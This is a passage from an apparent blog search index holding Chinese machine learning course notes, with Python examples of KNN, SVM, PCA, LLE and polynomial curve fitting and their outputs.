        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_blobs <span class="comment">#调用生成数据函数</span></span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier <span class="comment">#调用KNN分类器函数</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy.io <span class="keyword">import</span> loadmat</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">data=make_blobs(n_samples=<span class="number">1000</span>,n_features=<span class="number">2</span>,centers=<span class="number">5</span>,random_state=<span class="number">1</span>)<span class="comment">#生成数据</span></span><br><span class="line">x,y=data  <span class="comment">#x获取数据的横轴和纵轴坐标，y获取数据的类别(标签)</span></span><br><span class="line">plt.figure()<span class="comment">#产生一个画布</span></span><br><span class="line">plt.scatter(x[:,<span class="number">0</span>],x[:,<span class="number">1</span>],c=y,cmap=plt.cm.spring,edgecolor=<span class="string">&#x27;k&#x27;</span>)<span class="comment">#x[:,0]数据的横轴、x[:,1]数据的纵轴</span></span><br><span class="line">                    <span class="comment">#c:颜色；cm.spring数据点的可视化风格；edgecolor数据点的边界颜色。</span></span><br><span class="line">model=KNeighborsClassifier()<span class="comment">#生成一个初始化的knn分类器模型</span></span><br><span class="line">model.fit(x,y)<span class="comment">#对初始化的knn分类器进行训练（用现有的训练样本进行训练）</span></span><br><span class="line"></span><br><span class="line">xmin,xmax=x[:,<span class="number">0</span>].<span class="built_in">min</span>()-<span class="number">1</span>,x[:,<span class="number">0</span>].<span class="built_in">max</span>()+<span class="number">1</span><span class="comment">#获取训练样本横轴坐标的最小值和最大值</span></span><br><span class="line">ymin,ymax=x[:,<span class="number">1</span>].<span class="built_in">min</span>()-<span class="number">1</span>,x[:,<span class="number">1</span>].<span class="built_in">max</span>()+<span class="number">1</span><span class="comment">#获取训练样本纵轴坐标的最小值和最大值</span></span><br><span class="line">x1,y1=np.meshgrid(np.arange(xmin,xmax,<span class="number">0.02</span>),np.arange(ymin,ymax,<span class="number">0.02</span>))</span><br><span class="line"><span class="comment">#对整个训练样本数据的分布空间进行网格化</span></span><br><span class="line">z=model.predict(np.c_[x1.ravel(),y1.ravel()])<span class="comment">#对空间数据进行分类</span></span><br><span class="line">z=z.reshape(x1.shape)<span class="comment">#对分类后的数据进行变形（从一维变到二维）</span></span><br><span class="line">plt.figure()<span class="comment">#产生一个画布</span></span><br><span class="line">plt.pcolormesh(x1,y1,z,cmap=plt.cm.Pastel1)</span><br><span class="line">plt.scatter(x[:,<span class="number">0</span>],x[:,<span class="number">1</span>],c=y,cmap=plt.cm.spring,edgecolor=<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\ipykernel_launcher.py:16: MatplotlibDeprecationWarning: shading='flat' when X and Y have the same dimensions as C is deprecated since 3.3.  Either specify the corners of the quadrilaterals with X and Y, or pass shading='auto', 'nearest' or 'gouraud', or set rcParams['pcolor.shading'].  This will become an error two minor releases later.  app.launch_new_instance()</code></pre><p><img "" class="lazyload placeholder" data-original="output_1_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_1_2.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mnist=loadmat(<span class="string">&#x27;mnist-original.mat&#x27;</span>)</span><br><span class="line">x,y=mnist[<span class="string">&quot;data&quot;</span>],mnist[<span class="string">&quot;label&quot;</span>]</span><br><span class="line">x=x.T</span><br><span class="line">y=y[<span class="number">0</span>]</span><br><span class="line">some_digit=x[<span class="number">69000</span>]</span><br><span class="line">x_train=x[:<span class="number">60000</span>]</span><br><span class="line">y_train=y[:<span class="number">60000</span>]</span><br><span class="line">model=KNeighborsClassifier()</span><br><span class="line">model.fit(x_train,y_train)</span><br><span class="line"><span class="built_in">print</span>(model.predict([some_digit]))</span><br></pre></td></tr></table></figure><pre><code>[9.]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 机器学习课程(魏) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SVM</title>
      <link href="/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/SVM/"/>
      <url>/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/SVM/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</span><br><span class="line"> </span><br><span class="line">xs=np.arange(-<span class="number">5</span>,<span class="number">5</span>,<span class="number">0.2</span>)</span><br><span class="line">ys1=np.sqrt(<span class="number">25</span>-xs*xs)+np.random.uniform(-<span class="number">0.5</span>,<span class="number">0.5</span>,(xs.shape[<span class="number">0</span>]))</span><br><span class="line">ys2=-<span class="number">1</span>*np.sqrt(<span class="number">25</span>-xs*xs)+np.random.uniform(-<span class="number">0.5</span>,<span class="number">0.5</span>,(xs.shape[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">xys1=np.c_[xs,ys1]</span><br><span class="line"></span><br><span class="line">xys2=np.c_[xs,ys2]</span><br><span class="line"></span><br><span class="line">xy1=np.r_[xys1,xys2]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xh=np.arange(-<span class="number">8</span>,<span class="number">8</span>,<span class="number">0.2</span>)</span><br><span class="line">yh1=np.sqrt(<span class="number">64</span>-xh*xh)+np.random.uniform(-<span class="number">0.5</span>,<span class="number">0.5</span>,(xh.shape[<span class="number">0</span>]))</span><br><span class="line">yh2=-<span class="number">1</span>*np.sqrt(<span class="number">64</span>-xh*xh)+np.random.uniform(-<span class="number">0.5</span>,<span class="number">0.5</span>,(xh.shape[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">xyh1=np.c_[xh,yh1]</span><br><span class="line"></span><br><span class="line">xyh2=np.c_[xh,yh2]</span><br><span class="line"></span><br><span class="line">xy2=np.r_[xyh1,xyh2]</span><br><span class="line"></span><br><span class="line">xy3=np.r_[xy1,xy2]</span><br><span class="line">plt.figure()</span><br><span class="line"></span><br><span class="line">plt.scatter(xy3[<span class="number">0</span>:<span class="number">100</span>,<span class="number">0</span>],xy3[<span class="number">0</span>:<span class="number">100</span>,<span class="number">1</span>],c=<span class="string">&#x27;k&#x27;</span>,marker=<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">plt.scatter(xy3[<span class="number">100</span>:,<span class="number">0</span>],xy3[<span class="number">100</span>:,<span class="number">1</span>],c=<span class="string">&#x27;r&#x27;</span>,marker=<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fig=plt.figure()</span><br><span class="line">ax=Axes3D(fig)</span><br><span class="line"></span><br><span class="line">z1=xy3[:,<span class="number">0</span>]**<span class="number">2</span></span><br><span class="line">z2=xy3[:,<span class="number">1</span>]**<span class="number">2</span></span><br><span class="line">z3=xy3[:,<span class="number">1</span>]</span><br><span class="line">ax.scatter(z1[<span class="number">0</span>:<span class="number">100</span>],z2[<span class="number">0</span>:<span class="number">100</span>],z3[<span class="number">0</span>:<span class="number">100</span>],c=<span class="string">&#x27;k&#x27;</span>,marker=<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">ax.scatter(z1[<span class="number">100</span>:],z2[<span class="number">100</span>:],z3[<span class="number">100</span>:],c=<span class="string">&#x27;r&#x27;</span>,marker=<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\ipykernel_launcher.py:34: MatplotlibDeprecationWarning: Axes3D(fig) adding itself to the figure is deprecated since 3.4. Pass the keyword argument auto_add_to_figure=False and use fig.add_axes(ax) to suppress this warning. The default value of auto_add_to_figure will change to False in mpl3.5 and True values will no longer work in 3.6.  This is consistent with other Axes classes.</code></pre><p><img "" class="lazyload placeholder" data-original="output_0_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_0_2.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_moons</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> svm</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score <span class="keyword">as</span> cr<span class="comment">#调用交叉检验函数</span></span><br><span class="line">n_samples = <span class="number">600</span></span><br><span class="line">x,y=make_moons(n_samples=n_samples, noise=<span class="number">0.1</span>,random_state=<span class="number">3</span>)</span><br><span class="line">clf=svm.SVC(kernel=<span class="string">&#x27;rbf&#x27;</span>,gamma=<span class="number">0.5</span>,C=<span class="number">100</span>)<span class="comment">#poly代表分类线是曲线，degree是曲线的最高次幂</span></span><br><span class="line">clf.fit(x,y)</span><br><span class="line"><span class="comment">#clf.predict([x])</span></span><br><span class="line">xmin,xmax=x[:,<span class="number">0</span>].<span class="built_in">min</span>()-<span class="number">1</span>,x[:,<span class="number">0</span>].<span class="built_in">max</span>()+<span class="number">1</span></span><br><span class="line">ymin,ymax=x[:,<span class="number">1</span>].<span class="built_in">min</span>()-<span class="number">1</span>,x[:,<span class="number">1</span>].<span class="built_in">max</span>()+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">xx,yy=np.meshgrid(np.arange(xmin,xmax,<span class="number">0.02</span>),np.arange(ymin,ymax,<span class="number">0.02</span>))</span><br><span class="line"></span><br><span class="line">xf=np.c_[xx.ravel(),yy.ravel()];</span><br><span class="line">z=clf.predict(xf)</span><br><span class="line">z=z.reshape(xx.shape)</span><br><span class="line">plt.pcolormesh(xx,yy,z,cmap=plt.cm.Pastel1)</span><br><span class="line">plt.scatter(x[:,<span class="number">0</span>],x[:,<span class="number">1</span>],c=y)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cr(clf,x,y,cv=<span class="number">5</span>,scoring=<span class="string">&quot;accuracy&quot;</span>))</span><br><span class="line"></span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>[1.         0.99166667 1.         1.         1.        ]c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\ipykernel_launcher.py:20: MatplotlibDeprecationWarning: shading='flat' when X and Y have the same dimensions as C is deprecated since 3.3.  Either specify the corners of the quadrilaterals with X and Y, or pass shading='auto', 'nearest' or 'gouraud', or set rcParams['pcolor.shading'].  This will become an error two minor releases later.</code></pre><p><img "" class="lazyload placeholder" data-original="output_1_2.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 机器学习课程(魏) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主成分分析</title>
      <link href="/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E4%B8%BB%E6%88%90%E5%88%86%E5%88%86%E6%9E%90/"/>
      <url>/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E4%B8%BB%E6%88%90%E5%88%86%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="对数据降维后使用knn算法进行分类的案例"><a class="markdownIt-Anchor" href="#对数据降维后使用knn算法进行分类的案例">#</a> 对数据降维后使用 KNN 算法进行分类的案例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy.io <span class="keyword">import</span> loadmat</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> sklearn.decomposition <span class="keyword">import</span> PCA</span><br><span class="line">mnist=loadmat(<span class="string">&#x27;mnist-original.mat&#x27;</span>)<span class="comment">#获取原始数据</span></span><br><span class="line">x,y=mnist[<span class="string">&quot;data&quot;</span>],mnist[<span class="string">&quot;label&quot;</span>]<span class="comment">#分别获取原始数据的数据描述和数据标签</span></span><br><span class="line">x=x.T<span class="comment">#对原始数据描述进行转转置</span></span><br><span class="line">y=y[<span class="number">0</span>]</span><br><span class="line">pca=PCA()<span class="comment">#建立PCA模型</span></span><br><span class="line">pca.fit(x)<span class="comment">#通过PCA（主成分分析）对原始数据进行主成分分析,得到特征值和特征向量</span></span><br><span class="line">cumsum=np.cumsum(pca.explained_variance_ratio_)<span class="comment">#对特征值进行排序（从大到小进行排序），计算特征值的累计贡献率</span></span><br><span class="line">d=np.argmax(cumsum&gt;=<span class="number">0.95</span>)+<span class="number">1</span> <span class="comment">#设定一个累计贡献率的阈值，阈值为0.95，d是累计贡献率达到0.95的特征值的数量，d=154</span></span><br><span class="line">pca=PCA(n_components=d)<span class="comment">#对原始数据进行降维，从784维降到154维</span></span><br><span class="line">x1=pca.fit_transform(x)<span class="comment">#x1是降维之后的数据</span></span><br><span class="line">x_train=x1[:<span class="number">60000</span>]<span class="comment">#选择训练数据，原始数据有70000条，我们选择前60000作为训练样本，x_train代表前60000个样本的数据描述</span></span><br><span class="line">y_train=y[:<span class="number">60000</span>]<span class="comment">#前60000个样本的标签</span></span><br><span class="line">shuffle_index=np.random.permutation(<span class="number">60000</span>)<span class="comment">#对前60000个数据打乱顺序</span></span><br><span class="line">x_train=x_train[shuffle_index]</span><br><span class="line">y_train=y_train[shuffle_index]</span><br><span class="line">sgd_clf=KNeighborsClassifier()<span class="comment">#调用KNN分类器</span></span><br><span class="line">sgd_clf.fit(x_train,y_train)<span class="comment">#建立KNN分类器模型</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;clf.pickle&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(sgd_clf, f)</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>154</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy.io <span class="keyword">import</span> loadmat</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> sklearn.decomposition <span class="keyword">import</span> PCA</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score</span><br><span class="line"></span><br><span class="line">mnist=loadmat(<span class="string">&#x27;mnist-original.mat&#x27;</span>)</span><br><span class="line">x,y=mnist[<span class="string">&quot;data&quot;</span>],mnist[<span class="string">&quot;label&quot;</span>]</span><br><span class="line">x=x.T</span><br><span class="line">y=y[<span class="number">0</span>]</span><br><span class="line">pca=PCA(n_components=<span class="number">154</span>)</span><br><span class="line">x1=pca.fit_transform(x)</span><br><span class="line">some_digit=x1[<span class="number">66000</span>]</span><br><span class="line"></span><br><span class="line">x_test=x[<span class="number">60000</span>:]</span><br><span class="line">y_test=y[<span class="number">60000</span>:]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;clf.pickle&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    clf2 = pickle.load(f)</span><br><span class="line">y_pred = clf2.predict(x1[<span class="number">60000</span>:])</span><br><span class="line"><span class="built_in">print</span>(accuracy_score(y[<span class="number">60000</span>:], y_pred))</span><br></pre></td></tr></table></figure><pre><code>0.9719</code></pre><h3 id="lle"><a class="markdownIt-Anchor" href="#lle">#</a> LLE</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</span><br><span class="line"><span class="keyword">from</span> sklearn.manifold <span class="keyword">import</span> LocallyLinearEmbedding</span><br><span class="line"></span><br><span class="line">N=<span class="number">2000</span></span><br><span class="line">angle=np.pi*(<span class="number">1.5</span>*np.random.random(<span class="built_in">int</span>(N/<span class="number">2</span>))-<span class="number">1</span>)</span><br><span class="line">height=<span class="number">5</span>*np.random.random(N)</span><br><span class="line">x=np.array([np.append(np.cos(angle),-<span class="number">1</span>*np.cos(angle)),height,np.append(np.sin(angle),<span class="number">2</span>-np.sin(angle))])</span><br><span class="line">x=x.T</span><br><span class="line">fig=plt.figure()</span><br><span class="line">ax=Axes3D(fig)</span><br><span class="line">ax.scatter(x[:,<span class="number">0</span>],x[:,<span class="number">1</span>],x[:,<span class="number">2</span>])</span><br><span class="line">lle=LocallyLinearEmbedding(n_components=<span class="number">2</span>,n_neighbors=<span class="number">12</span>)<span class="comment">#n_neighbors不能太小，也不能太大</span></span><br><span class="line"><span class="comment">#如果太小结果不理想，如果太大，则效果接近于PCA（主成分分析），原论文推荐是12</span></span><br><span class="line">x2d=lle.fit_transform(x)</span><br><span class="line">plt.figure()</span><br><span class="line">plt.plot(x2d[:,<span class="number">0</span>],x2d[:,<span class="number">1</span>],<span class="string">&#x27;k.&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\ipykernel_launcher.py:12: MatplotlibDeprecationWarning: Axes3D(fig) adding itself to the figure is deprecated since 3.4. Pass the keyword argument auto_add_to_figure=False and use fig.add_axes(ax) to suppress this warning. The default value of auto_add_to_figure will change to False in mpl3.5 and True values will no longer work in 3.6.  This is consistent with other Axes classes.  if sys.path[0] == '':</code></pre><p><img "" class="lazyload placeholder" data-original="output_4_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_4_2.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p>]]></content>
      
      
      <categories>
          
          <category> 机器学习课程(魏) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拟合</title>
      <link href="/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E6%8B%9F%E5%90%88/"/>
      <url>/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E6%8B%9F%E5%90%88/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy.linalg <span class="keyword">as</span> lg</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> PolynomialFeatures <span class="keyword">as</span> pl</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">x=np.linspace(-<span class="number">20</span>,<span class="number">20</span>,<span class="number">50</span>)</span><br><span class="line">y=<span class="number">2</span>*x+<span class="number">0.2</span>*x**<span class="number">2</span>+<span class="number">1</span>+np.random.uniform(-<span class="number">5</span>,<span class="number">5</span>,x.shape)</span><br><span class="line">plt.figure</span><br><span class="line">plt.plot(x,y,<span class="string">&#x27;k*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">A=np.c_[x**<span class="number">2</span>,x,np.ones(x.shape)]</span><br><span class="line">B=y.reshape(y.shape[<span class="number">0</span>],<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">eta=<span class="number">0.00001</span></span><br><span class="line">n=<span class="number">10000</span></span><br><span class="line">m=x.shape[<span class="number">0</span>]</span><br><span class="line">arf=np.random.randn(<span class="number">3</span>,<span class="number">1</span>)*<span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    gradients=<span class="number">2</span>/m*A.T.dot(A.dot(arf)-B)</span><br><span class="line">    arf=arf-eta*gradients</span><br><span class="line"></span><br><span class="line">w=lg.inv(A.T.dot(A)).dot(A.T).dot(y)</span><br><span class="line"></span><br><span class="line">plt.plot(x,x**<span class="number">2</span>*arf[<span class="number">0</span>]+x*arf[<span class="number">1</span>]+arf[<span class="number">2</span>])</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_1_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">t=np.arange(<span class="number">1</span>,<span class="number">17</span>,<span class="number">1</span>)</span><br><span class="line">y=np.array([<span class="number">4</span>,<span class="number">6.4</span>,<span class="number">8</span>,<span class="number">8.8</span>,<span class="number">9.22</span>,<span class="number">9.5</span>,<span class="number">9.7</span>,<span class="number">9.86</span>,<span class="number">10</span>,<span class="number">10.20</span>,<span class="number">10.32</span>,<span class="number">10.42</span>,<span class="number">10.5</span>,<span class="number">10.55</span>,<span class="number">10.58</span>,<span class="number">10.6</span></span><br><span class="line">])</span><br><span class="line">plt.figure()</span><br><span class="line">plt.plot(t,y,<span class="string">&#x27;k*&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># y=at^2+bt+c</span></span><br><span class="line"></span><br><span class="line">A=np.c_[t**<span class="number">2</span>,t,np.ones(t.shape)]</span><br><span class="line"></span><br><span class="line">w=lg.inv(A.T.dot(A)).dot(A.T).dot(y)</span><br><span class="line"></span><br><span class="line">plt.plot(t,w[<span class="number">0</span>]*t**<span class="number">2</span>+w[<span class="number">1</span>]*t+w[<span class="number">2</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_2_0.png" 